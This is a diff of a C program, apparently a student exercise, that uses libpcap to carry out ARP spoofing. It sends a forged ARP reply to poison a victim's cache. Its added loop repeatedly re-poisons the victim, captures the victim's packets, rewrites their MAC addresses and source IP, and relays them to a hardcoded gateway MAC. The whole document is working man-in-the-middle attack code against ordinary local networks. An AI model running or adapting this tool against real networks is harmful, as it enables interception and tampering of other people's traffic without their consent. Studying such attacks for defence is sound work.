@@ -86,32 +86,32 @@ int main(int argc, char **argv)
     ifreq *ifr;
     ifr = get_host_mac("enp0s3"); // my mac address
 
-    u_char ips[4];  //victim ip
+    u_char ips[4];  //sender ip(target)
     for(int i=0; i<4; i++)
         ips[i] = inet_addr(argv[2]) >> (8 * i) & 0xff;
-    u_char ipd[4];  //gateway ip
+    u_char ipd[4];  //target ip(gateway)
     for(int i=0; i<4; i++)
         ipd[i] = inet_addr(argv[3]) >> (8 * i) & 0xff;
 
-    u_char ipm[4] = {0xc0, 0xa8, 0x2b, 0xff};   //my ip
-    u_char bmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-    u_char lmac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    u_char ipm[4] = {0xc0, 0xa8, 0x2b, 0xe1};   //my ip
+    u_char bmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};  //broadcast mac addr eth
+    u_char lmac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};  //broadcast mac addr arp
 
     //ARP Request
-    eth_Make(&ethhd, &bmac[0], &ifr[0]);
-    arp_Make(&arphd, &lmac[0], &ifr[0], &ips[0], &ipm[0], 1);
+    eth_Make(&ethhd, &bmac[0], &ifr[0]);    //arp request eth header
+    arp_Make(&arphd, &lmac[0], &ifr[0], &ips[0], &ipm[0], 1);   //arp request arp header
 //    arp_send(&ethhd, &arphd, handle, &packet[0]);
 
-    memset(packet, 0 ,sizeof(packet));
-    memcpy(packet, &ethhd, sizeof(ethhd));
-    memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));
-    for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
+    memset(packet, 0 ,sizeof(packet));  //packet init
+    memcpy(packet, &ethhd, sizeof(ethhd));  //packet + eth header
+    memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));  //eth header + arp header
+//    for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
     printf("\n");
-    if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
+    if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)    //arp request packet send
     {
         printf("send error");
     }
-    printf("Wow!!");
+    printf("ARP Request Wow!!");
 
     //arp reply
     u_char smac[6];
@@ -122,19 +122,28 @@ int main(int argc, char **argv)
 
         pcap_next_ex(handle, &header, &pacre);
         printf("%u bytes captured\n", header->caplen);
-        if(pacre[12] == 0x08 && pacre[13] == 0x06)
+        if(pacre[12] == 0x08 && pacre[13] == 0x06)  //ethernet header type : ARP(0x0806)
         {
             printf("ARP packet\n");
-            if(pacre[20] == 0x00 && pacre[21] == 0x02)
+            if(pacre[20] == 0x00 && pacre[21] == 0x02)  //arp header Opcode : reply(0x0002)
             {
-                printf("ARP Reply packet");
-                smac[0] = pacre[22];
-                smac[1] = pacre[23];
-                smac[2] = pacre[24];
-                smac[3] = pacre[25];
-                smac[4] = pacre[26];
-                smac[5] = pacre[27];
-                break;
+                int j=0;
+                for(int i=0; i<4; i++)
+                {
+                    if(ips[i] == pacre[i+28]) j++;  //request target ip == reply sender ip
+                }
+                if(j==4)    //ARP Reply
+                {
+                    printf("ARP Reply packet");
+                    //Sender Mac Address
+                    smac[0] = pacre[22];
+                    smac[1] = pacre[23];
+                    smac[2] = pacre[24];
+                    smac[3] = pacre[25];
+                    smac[4] = pacre[26];
+                    smac[5] = pacre[27];
+                    break;
+                }
             }
         }
     }
@@ -156,21 +165,86 @@ int main(int argc, char **argv)
     memcpy(arphd.arp_dmac, smac, 6);    //victim mac
     memcpy(arphd.arp_dip, ips, 4);      //victim ip
 */
-    eth_Make(&ethhd, &smac[0], &ifr[0]);
-    arp_Make(&arphd, &smac[0], &ifr[0], &ips[0], &ipd[0], 2);
+    eth_Make(&ethhd, &smac[0], &ifr[0]);    //arp reply eth header
+    arp_Make(&arphd, &smac[0], &ifr[0], &ips[0], &ipd[0], 2); //arp reply arp header
 
     memset(packet, 0 ,sizeof(packet));
     memcpy(packet, &ethhd, sizeof(ethhd));
     memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));
-    for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
+//    for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
     printf("\n");
 
-    if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
+    if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)    //arp reply send
     {
         printf("send error");
         return 0;
     }
     printf("Wow!!");
+//------------------------------------send arp----------------------
+    int p=1000;
+    while(p--)
+    {
+        if(p%10 == 0)
+        {
+        //arp reply !!
+        memset(packet, 0 ,sizeof(packet));
+        memcpy(packet, &ethhd, sizeof(ethhd));
+        memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));
+        for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
+        printf("\n");
+
+        if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
+        {
+            printf("send error");
+            return 0;
+        }
+        printf("Wow!!");
+        }
+
+        //sender catch
+        struct pcap_pkthdr* headers;
+        const u_char* pacspo;
+//        u_char gmac[6] = {0x52, 0x54, 0x00, 0x12, 0x35, 0x02};
+        u_char gmac[6] = {0x2c, 0x59, 0x8a, 0x59, 0x4a, 0x68};  //gateway mac, later source change!!
+        pcap_next_ex(handle, &headers, &pacspo);
+        printf("%u bytes captured\n", headers->caplen);
+        u_char rely[6];
+        u_char pac[1500];
+        memcpy(rely, &pacspo[6], 6);
+        int j=0;
+        for(int i=0; i<6; i++)
+        {
+            if(smac[i] == rely[i]) j++; //target mac == catch packet mac
+        }
+        if(j==6)
+        {
+            printf("ARP relay\n");
+//            size_t k = sizeof(pacspo);
+//            printf("      %u\n", headers->caplen);
+            memset(pac, 0, headers->caplen);
+            memcpy(pac, pacspo, headers->caplen);
+//            for(int i=0; i<4; i++)
+//            {
+//                printf("  %02x\n", pac[i]);
+//                printf("  %x\n", pac[i+26]);
+//            }
+            memcpy(pac, gmac, 6);   //my mac -> gateway mac
+            memcpy(&pac[6], ifr->ifr_hwaddr.sa_data, 6);    //eth source mac -> my mac address
+            for(int i=0; i<4; i++)
+            {
+//                printf("%02x\n", pac[i]);
+
+                pac[i+26] = ipm[i]; //tcp packet source ip -> my ip
+//                printf("%x\n", pac[i+26]);
+            }
+            if(pcap_sendpacket(handle, pac, headers->caplen) != 0)
+            {
+                printf("send error22!!\n");
+                return 0;
+            }
+
+        }
+    }
 
     return 0;
 }
